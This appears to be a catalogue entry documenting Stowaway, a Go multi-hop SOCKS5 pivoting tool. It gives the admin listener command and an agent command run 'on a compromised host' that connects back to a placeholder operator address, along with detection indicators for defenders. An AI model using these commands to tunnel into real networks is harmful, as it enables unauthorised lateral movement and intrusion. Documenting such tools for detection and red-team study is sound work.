---
Name: Stowaway
Description: Stowaway is a multi-hop proxy/pivoting tool written in Go. A single admin node on the operator's host can chain multiple agent nodes together, relaying SOCKS5 traffic and TCP port forwards across the chain. Nodes can connect actively or listen passively, optionally through a SOCKS5/HTTP upstream proxy, and the transport between nodes can be plain TCP, HTTP or WebSocket.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: ./stowaway_admin -l 9999 -s <KEY>
    Description: Starts the admin node on the operator's host, listening for an agent connection. The -s key encrypts node-to-node traffic and must match on every node in the chain.
    Usecase: Operator side of a multi-hop SOCKS5 pivot.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: ./stowaway_agent -c <ADMIN_IP>:9999 -s <KEY>
    Description: Starts an agent node on a compromised host, connecting back to the admin node to join the proxy chain.
    Usecase: Pivoting into an internal network segment reachable from the compromised host.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Full_Path:
  - Filename: stowaway_admin
  - Filename: stowaway_agent
  - Path: Downloaded/compiled Stowaway binaries, executed anywhere on the system.
Detection:
  - Command: Execution of a binary named stowaway_admin or stowaway_agent (or a renamed copy) with -l, -c or -s arguments.
  - Command: Outbound connections carrying SOCKS5 framing to an uncategorized host, particularly when wrapped in HTTP or WebSocket via the --up/--down options.
Resources:
  - Link: https://github.com/ph4ntonn/Stowaway
---
